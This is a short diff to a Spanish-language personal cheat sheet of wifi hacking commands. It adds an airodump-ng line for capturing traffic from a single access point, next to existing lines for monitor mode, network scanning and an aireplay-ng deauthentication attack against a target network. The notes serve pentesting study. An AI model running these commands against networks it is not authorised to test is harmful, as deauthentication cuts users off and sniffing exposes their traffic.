@@ -8,6 +8,8 @@
 			> Descubrimiento d eredes wiffi
 				# airmon-ng start [interface-name] 		// para poner la tarjeta de red indicada en modo monitor
 				# airodump-ng [interface-name-monitori-mode] 		//buscar redes inalambricas
+			> Snifar trafico AP
+				# airodump-ng -c1 --bssid [BSSID]		// snifar unicamente el trafico de un AP
 			> Ataque de desautentificacion
 				# iwconfig [interface-name-monitori-mode] channel [nº-wifi-to-desauth]			// configuracion de la tarjeta en el canal de la red wiffi a deautenticar
 				# aireplay-ng --deauth [nº-paqutes(50)] -a [BBID-to-hack] [interface-name-monitori-mode] 		//ataque de desautentificaccion contra toda la red
